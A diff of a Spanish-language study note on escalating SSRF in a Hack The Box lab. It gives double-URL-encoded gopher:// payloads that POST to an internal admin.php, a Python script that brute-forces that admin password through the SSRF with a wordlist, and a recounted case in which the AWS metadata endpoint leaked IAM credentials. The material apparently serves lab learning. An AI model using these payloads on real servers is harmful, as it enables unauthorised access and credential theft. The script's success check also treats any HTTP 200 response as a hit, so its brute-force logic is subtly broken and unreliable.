@@ -9,9 +9,7 @@ Nota previa: "[[02 - Identificación de SSRF]]"
 Nota siguiente: "[[04 - Blind SSRF]]"
 Area: "[[SSRF.base|SSRF]]"
 ---
----
-
-Confirmada la SSRF y mapeada la red interna, el objetivo es **aumentar el impacto**: alcanzar endpoints que solo escuchan en local, leer ficheros del servidor y —el salto cualitativo— enviar peticiones arbitrarias a servicios internos con `gopher://`.
+Confirmada la SSRF y mapeada la red interna, el objetivo es **aumentar el impacto**: <mark style="background: #ADCCFFA6;">alcanzar endpoints que solo escuchan en local, leer ficheros del servidor y —el salto cualitativo— enviar peticiones arbitrarias a servicios internos</mark> con `gopher://`.
 
 > [!example]+ Caso real — ESEA → metadata de AWS · $1.000
 > Brett Buerhaus llegó a un endpoint `media_preview.php?url=` (image fetch). Tras fallar los bypasses de null-byte, convirtió el `/1.png` final en query-string (`?url=http://ziot.org?1.png`) y ESEA renderizó **su web** → SSRF confirmada. Ben Sadeghipour sugirió apuntar `url` a `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — como ESEA corría en **AWS**, devolvió las **credenciales IAM** vivas del servidor. **Lección**: confirmada la SSRF, *piensa a lo grande* — el endpoint de metadata cloud bate cualquier truco menor.
@@ -32,6 +30,12 @@ $ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt \
 [Status: 200] FUZZ: admin
 [Status: 200] FUZZ: availability
 ```
+
+> [!attention]+ Uso de `&date`
+> El parámetro `&date=2024-01-01` se incluye porque el código backend de la aplicación web requiere **ambos campos al mismo tiempo** para procesar el formulario correctamente.
+> - **Comportamiento de la aplicación:** La función legítima que imita este ejercicio de HTB es consultar la disponibilidad de un sistema en una fecha concreta. Por ello, el formulario original espera recibir tanto el servidor (`dateserver`) como el día deseado (`date`).
+> - **Evitar fallos previos a la SSRF:** Si enviaras únicamente el parámetro `dateserver`, <mark style="background: #FFB8EBA6;">la aplicación devolvería un error previo de validación</mark> (por ejemplo, un aviso de "Parámetro 'date' faltante") y detendría la ejecución del código antes de llegar a realizar la petición de red (el _sink_ vulnerable a SSRF).
+> - **Replicar el tráfico legítimo:** Para que `ffuf` reciba respuestas válidas que te permitan analizar si un recurso existe o no, <mark style="background: #ADCCFFA6;">debes enviar la solicitud exactamente igual a como la enviaría el navegador web en uso normal</mark>, <mark style="background: #FF5582A6;">cambiando únicamente el valor que deseas fuzzear</mark> (`FUZZ`).
 
 <mark style="background: #FF5582A6;">Aparece `/admin.php`</mark>, un endpoint interno que ahora podemos solicitar vía SSRF (`dateserver=http://dateserver.htb/admin.php`) — potencialmente acceso a información de administración que la red perimetral protegía.
 
@@ -68,8 +72,84 @@ gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserv
 
 > [!warning]+ Doble URL-encoding
 > Como esta URL gopher viaja **dentro** del parámetro `dateserver` (que ya es `application/x-www-form-urlencoded`), hay que **codificar la URL entera una segunda vez** para que llegue intacta al cliente HTTP. Si no, obtienes un `Malformed URL`. Es el error más común al construir payloads gopher a mano.
+> 
+> En la <mark style="background: #ADCCFFA6;">segunda codificación del formulario HTTP</mark>: Convierte cada símbolo de porcentaje `%` en `%25` (y los dos puntos `:` en `%3a`). Esto protege los `%` para que el servidor web no los consuma antes de tiempo.
 
-El resultado: el endpoint interno acepta el `POST` y entramos al panel. La misma técnica habla con **cualquier servicio TCP**, no solo HTTP.
+El resultado: el endpoint interno acepta el `POST` y entramos al panel. La misma técnica habla con **cualquier servicio TCP**, no solo HTTP. Aquí podemos ver <mark style="background: #FFB8EBA6;">cómo queda la solicitud tras las dos codificaciones de la URL</mark>:
+```http
+POST /index.php HTTP/1.1
+Host: 172.17.0.2
+Content-Length: 265
+Content-Type: application/x-www-form-urlencoded
+
+dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
+```
+
+## Enviar la solicitud de `gopher://`
+<mark style="background: #ADCCFFA6;">Una vez ya tenemos el payload podemos sustituir el valor del parámetro vulnerable</mark> (`dateserver`) en Burp Suite Repeater o mediante `curl` por la cadena codificada dos veces (<mark style="background: #FF5582A6;">importante incluir el parámetro necesario si lo hubiere</mark>, como en este caso `&date`):
+```HTTP
+POST /index.php HTTP/1.1
+Host: 172.17.0.2
+Content-Length: 265
+Content-Type: application/x-www-form-urlencoded
+
+dateserver=gopher%3A%2F%2Fdateserver.htb%3A80%2F_POST%2520%2Fadmin.php%2520HTTP%252F1.1%250D%250AHost%253A%2520dateserver.htb%250D%250AContent-Length%253A%252013%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
+```
+
+Sin embargo, esto solo manda una solicitud (probando con la contraseña `admin`), si quisiéramos lanzar un ataque de fuerza bruta a través de un payload `gopher://`, <mark style="background: #FF5582A6;">no basta con cambiar la palabra por un diccionario simple</mark> en una herramienta como `ffuf`. Hay dos obstáculos técnicos que se deben gestionar: **la longitud del cuerpo (`Content-Length`)** y el **doble URL-encoding**.
+
+Si la contraseña cambia de longitud (por ejemplo, de `admin` de 5 letras a `password123` de 11), la cabecera `Content-Length` del `POST` interno <mark style="background: #ADCCFFA6;">también debe actualizarse en cada intento</mark>. De lo contrario, el servidor interno rechazará la petición o leerá datos incompletos.
+
+El script se encarga de calcular dinámicamente la longitud exacta de cada intento y formatear el payload `gopher://` sobre la marcha.
+
+```Python
+import urllib.parse
+import requests
+
+url_vulnerable = "http://172.17.0.2/index.php"
+
+# Ruta del WordList que queramos usar
+seclist_path = "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
+
+# Abrir el archivo ignorando posibles errores de codificación
+with open(seclist_path, "r", encoding="utf-8", errors="ignore") as file:
+    for line in file:
+        password = line.strip()  # Eliminar saltos de línea y espacios
+        if not password:
+            continue
+            
+        # 1. Calcular el cuerpo POST y su longitud exacta
+        post_body = f"adminpw={password}"
+        content_length = len(post_body)
+        
+        # 2. Construir la petición HTTP interna en bruto
+        raw_http = (
+            f"POST /admin.php HTTP/1.1\r\n"
+            f"Host: dateserver.htb\r\n"
+            f"Content-Length: {content_length}\r\n"
+            f"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
+            f"{post_body}"
+        )
+        
+        # 3. Primer Encoding (para formar el esquema gopher)
+        gopher_payload = "gopher://dateserver.htb:80/_" + urllib.parse.quote(raw_http)
+        
+        # 4. Segundo Encoding (para viajar en el parámetro de la petición)
+        double_encoded_payload = urllib.parse.quote(gopher_payload)
+        
+        # 5. Enviar la petición al backend
+        data = {
+            "dateserver": double_encoded_payload,
+            "date": "2024-01-01"
+        }
+        
+        response = requests.post(url_vulnerable, data=data)
+        
+        # 6. Comprobar la respuesta
+        if "Acceso concedido" in response.text or response.status_code == 200:
+            print(f"\n[+] ¡Contraseña encontrada!: {password}")
+            break
+```
 
 # `gopher://` contra servicios internos: el alto impacto
 
